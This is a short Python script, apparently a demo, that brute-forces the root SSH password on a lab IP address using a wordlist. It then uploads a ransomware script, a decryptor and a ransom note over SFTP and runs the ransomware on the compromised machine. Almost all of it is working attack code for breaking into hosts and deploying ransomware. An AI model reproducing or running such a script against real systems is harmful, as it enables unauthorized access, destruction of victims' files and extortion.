import paramiko
import socket 

ip = '192.168.221.135'
count = 0

def ssh_connect(password,ip):
    ssh= paramiko.client.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try: 
        ssh.connect(ip, port=int(float(22)), username="root", password=password)
        print(password + " Bingo!")
        print("copying Files to target machine")
        sftp = ssh.open_sftp()
        sftp.put("./Ransomware.py", "/home/Ransomware.py")
        sftp.put("./Decrypt.py", "/home/Decrypt.py")
        sftp.put("./READTHIS!.txt", "/home/READTHIS!.txt")
        sftp.close()
        try: 
            print("Trying to run ransomware")
            command = "cd /home \n ls \n python3 Ransomware.py"
            stdin,stdout,stderr  = ssh.exec_command(command)
        except:
            print("Ransomware failed")
    except paramiko.AuthenticationException:
        ssh.close()
        print(password + " is not the right password")

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
result = sock.connect_ex((ip,22))
if result == 0:
    print("Test if port 22 is open")
    with open("list.txt", "r") as words:
        passwords = words.readlines()
    print("If open start dictionary attack (very small dictionary for demo purpose")
    for line in passwords:
        ssh_connect(line.strip(), ip)
else:
    print("Port is not open")
sock.close()

